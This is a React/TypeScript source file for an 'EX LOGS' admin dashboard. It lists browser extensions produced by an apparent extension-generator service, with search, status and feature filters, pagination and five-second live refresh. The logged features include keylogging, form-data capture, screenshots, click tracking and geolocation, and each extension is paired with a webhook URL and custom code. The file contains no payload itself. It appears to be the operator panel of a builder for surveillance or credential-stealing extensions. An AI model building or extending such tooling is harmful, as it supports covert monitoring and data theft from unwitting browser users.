import { useQuery } from "@tanstack/react-query";
import { useState } from "react";
import { Search, Filter, ChevronLeft, ChevronRight, Activity, Shield, Globe, Eye, FileText, Mouse, Keyboard, Bug, Download } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import Sidebar from "@/components/dashboard/sidebar";

interface ExtensionLog {
  id: string;
  userId: string;
  extensionName: string;
  extensionDescription: string;
  extensionVersion: string;
  permissions: string[];
  features: string[];
  webhookUrl: string;
  customCode: string;
  generationStatus: 'success' | 'error' | 'validation_failed';
  errorMessage?: string;
  downloadCount: number;
  extensionId: string;
  ipAddress: string;
  userAgent: string;
  location: string;
  zipFileSize: number;
  manifestValid: boolean;
  scriptsValid: boolean;
  createdAt: string;
  lastWebhookSent?: string;
}

interface ExtensionLogsResponse {
  logs: ExtensionLog[];
  total: number;
}

export default function ExtensionLogs() {
  const [currentPage, setCurrentPage] = useState(1);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [featureFilter, setFeatureFilter] = useState<string>("all");
  const logsPerPage = 20;

  const { data, isLoading } = useQuery<ExtensionLogsResponse>({
    queryKey: ['/api/extension-logs', { limit: logsPerPage, offset: (currentPage - 1) * logsPerPage }],
    refetchInterval: 5000, // Refetch every 5 seconds for updates
  });

  const filteredLogs = data?.logs.filter(log => {
    const matchesSearch = log.extensionName.toLowerCase().includes(search.toLowerCase()) ||
                         log.extensionDescription.toLowerCase().includes(search.toLowerCase()) ||
                         log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
                         log.location.toLowerCase().includes(search.toLowerCase()) ||
                         log.extensionId.toLowerCase().includes(search.toLowerCase());

    const matchesStatus = statusFilter === "all" || log.generationStatus === statusFilter;
    
    const matchesFeature = featureFilter === "all" || log.features.includes(featureFilter);

    return matchesSearch && matchesStatus && matchesFeature;
  }) || [];

  const totalPages = Math.ceil((data?.total || 0) / logsPerPage);

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });
  };

  const getFeatureIcon = (feature: string) => {
    const icons = {
      'ip_tracking': Globe,
      'geolocation': Globe,
      'browser_info': Shield,
      'screenshot': Eye,
      'form_data': FileText,
      'click_tracking': Mouse,
      'keylogger': Keyboard
    };
    return icons[feature as keyof typeof icons] || Bug;
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'success':
        return <Badge variant="default" className="bg-green-500/20 text-green-300 border-green-500/30">✅ Success</Badge>;
      case 'error':
        return <Badge variant="destructive" className="bg-red-500/20 text-red-300 border-red-500/30">❌ Error</Badge>;
      case 'validation_failed':
        return <Badge variant="secondary" className="bg-yellow-500/20 text-yellow-300 border-yellow-500/30">⚠️ Validation Failed</Badge>;
      default:
        return <Badge variant="outline">{status}</Badge>;
    }
  };

  const formatFileSize = (bytes: number) => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  };

  if (isLoading) {
    return (
      <div className="flex h-screen bg-background">
        <Sidebar />
        <main className="flex-1 overflow-auto p-6">
          <header className="mb-6">
            <h1 className="text-3xl font-bold text-foreground">EX LOGS</h1>
            <p className="text-muted-foreground mt-2">Extension activity and generation logs</p>
          </header>
          <div className="space-y-4">
            {[...Array(5)].map((_, i) => (
              <Skeleton key={i} className="h-24 w-full" />
            ))}
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-background">
      <Sidebar />
      <main className="flex-1 overflow-auto p-6">
        <header className="mb-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-foreground flex items-center gap-2">
                <Activity className="h-8 w-8 text-primary" />
                EX LOGS
              </h1>
              <p className="text-muted-foreground mt-2">Extension activity and generation logs - Total: {data?.total || 0}</p>
            </div>
            <Badge className="bg-primary/20 text-primary border-primary/30">
              Live Updates
            </Badge>
          </div>
        </header>

        {/* Filters Section */}
        <Card className="mb-6">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Filter className="h-5 w-5" />
              Filters & Search
            </CardTitle>
            <CardDescription>Filter extension logs by status, features, or search terms</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="flex flex-col lg:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  <Input
                    type="text"
                    placeholder="Search extension names, IPs, locations..."
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    className="pl-10"
                    data-testid="input-search-extensions"
                  />
                </div>
              </div>
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="w-full lg:w-[180px]" data-testid="select-status-filter">
                  <SelectValue placeholder="Status" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Status</SelectItem>
                  <SelectItem value="success">Success</SelectItem>
                  <SelectItem value="error">Error</SelectItem>
                  <SelectItem value="validation_failed">Validation Failed</SelectItem>
                </SelectContent>
              </Select>
              <Select value={featureFilter} onValueChange={setFeatureFilter}>
                <SelectTrigger className="w-full lg:w-[180px]" data-testid="select-feature-filter">
                  <SelectValue placeholder="Features" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Features</SelectItem>
                  <SelectItem value="ip_tracking">IP Tracking</SelectItem>
                  <SelectItem value="geolocation">Geolocation</SelectItem>
                  <SelectItem value="browser_info">Browser Info</SelectItem>
                  <SelectItem value="screenshot">Screenshots</SelectItem>
                  <SelectItem value="form_data">Form Data</SelectItem>
                  <SelectItem value="click_tracking">Click Tracking</SelectItem>
                  <SelectItem value="keylogger">Keystroke Logging</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </CardContent>
        </Card>

        {/* Logs Display */}
        <div className="space-y-4">
          {filteredLogs.length === 0 ? (
            <Card>
              <CardContent className="p-12 text-center">
                <Activity className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                <h3 className="text-lg font-semibold text-foreground mb-2">No Extension Logs Found</h3>
                <p className="text-muted-foreground">
                  {search || statusFilter !== "all" || featureFilter !== "all" 
                    ? "No logs match your current filters. Try adjusting your search criteria."
                    : "No extensions have been generated yet. Create your first extension to see logs here."
                  }
                </p>
              </CardContent>
            </Card>
          ) : (
            filteredLogs.map((log) => (
              <Card key={log.id} className="hover:bg-muted/50 transition-colors" data-testid={`card-extension-${log.id}`}>
                <CardHeader className="pb-4">
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <CardTitle className="flex items-center gap-2 text-lg">
                        <Download className="h-5 w-5 text-primary" />
                        {log.extensionName}
                        <span className="text-sm font-normal text-muted-foreground">v{log.extensionVersion}</span>
                      </CardTitle>
                      <CardDescription className="mt-1">
                        {log.extensionDescription}
                      </CardDescription>
                      <div className="flex items-center gap-2 mt-2 text-xs text-muted-foreground">
                        <span>Extension ID: {log.extensionId}</span>
                        <span>•</span>
                        <span>{formatTimestamp(log.createdAt)}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      {getStatusBadge(log.generationStatus)}
                      <Badge variant="outline" className="text-xs">
                        {log.downloadCount} downloads
                      </Badge>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Features */}
                  <div>
                    <h4 className="text-sm font-medium text-foreground mb-2">Features:</h4>
                    <div className="flex flex-wrap gap-2">
                      {log.features.map((feature) => {
                        const Icon = getFeatureIcon(feature);
                        return (
                          <Badge key={feature} variant="secondary" className="text-xs">
                            <Icon className="h-3 w-3 mr-1" />
                            {feature.replace('_', ' ')}
                          </Badge>
                        );
                      })}
                    </div>
                  </div>

                  {/* Permissions */}
                  <div>
                    <h4 className="text-sm font-medium text-foreground mb-2">Permissions:</h4>
                    <div className="flex flex-wrap gap-1">
                      {log.permissions.map((permission) => (
                        <Badge key={permission} variant="outline" className="text-xs">
                          {permission}
                        </Badge>
                      ))}
                    </div>
                  </div>

                  {/* Technical Details */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-sm">
                    <div>
                      <span className="font-medium text-muted-foreground">IP Address:</span>
                      <p className="text-foreground font-mono">{log.ipAddress}</p>
                    </div>
                    <div>
                      <span className="font-medium text-muted-foreground">Location:</span>
                      <p className="text-foreground">{log.location}</p>
                    </div>
                    <div>
                      <span className="font-medium text-muted-foreground">File Size:</span>
                      <p className="text-foreground">{formatFileSize(log.zipFileSize)}</p>
                    </div>
                    <div>
                      <span className="font-medium text-muted-foreground">Webhook:</span>
                      <p className="text-foreground">{log.webhookUrl ? '✅ Configured' : '❌ None'}</p>
                    </div>
                  </div>

                  {/* Validation Status */}
                  <div className="flex gap-4 text-sm">
                    <div className="flex items-center gap-1">
                      <span className="font-medium text-muted-foreground">Manifest:</span>
                      <Badge variant={log.manifestValid ? "default" : "destructive"} className="text-xs">
                        {log.manifestValid ? '✅ Valid' : '❌ Invalid'}
                      </Badge>
                    </div>
                    <div className="flex items-center gap-1">
                      <span className="font-medium text-muted-foreground">Scripts:</span>
                      <Badge variant={log.scriptsValid ? "default" : "destructive"} className="text-xs">
                        {log.scriptsValid ? '✅ Valid' : '❌ Invalid'}
                      </Badge>
                    </div>
                  </div>

                  {/* Error Message */}
                  {log.errorMessage && (
                    <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3">
                      <h5 className="font-medium text-destructive mb-1">Error Details:</h5>
                      <p className="text-sm text-destructive/80">{log.errorMessage}</p>
                    </div>
                  )}

                  {/* User Agent (truncated) */}
                  <div className="text-xs text-muted-foreground border-t pt-2">
                    <span className="font-medium">User Agent:</span>
                    <span className="ml-2 font-mono">{log.userAgent.length > 100 ? `${log.userAgent.substring(0, 100)}...` : log.userAgent}</span>
                  </div>
                </CardContent>
              </Card>
            ))
          )}
        </div>

        {/* Pagination */}
        {totalPages > 1 && (
          <div className="flex items-center justify-between mt-8 p-4 bg-card rounded-lg border">
            <p className="text-sm text-muted-foreground">
              Showing {Math.min((currentPage - 1) * logsPerPage + 1, data?.total || 0)}-{Math.min(currentPage * logsPerPage, data?.total || 0)} of {data?.total || 0} entries
            </p>
            <div className="flex items-center space-x-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
                disabled={currentPage === 1}
                data-testid="button-previous-page"
              >
                <ChevronLeft className="h-4 w-4" />
                Previous
              </Button>

              <div className="flex items-center space-x-1">
                {[...Array(Math.min(5, totalPages))].map((_, i) => {
                  const pageNum = i + 1;
                  return (
                    <Button
                      key={pageNum}
                      variant={currentPage === pageNum ? "default" : "outline"}
                      size="sm"
                      onClick={() => setCurrentPage(pageNum)}
                      data-testid={`button-page-${pageNum}`}
                    >
                      {pageNum}
                    </Button>
                  );
                })}
              </div>

              <Button
                variant="outline"
                size="sm"
                onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
                disabled={currentPage === totalPages}
                data-testid="button-next-page"
              >
                Next
                <ChevronRight className="h-4 w-4" />
              </Button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}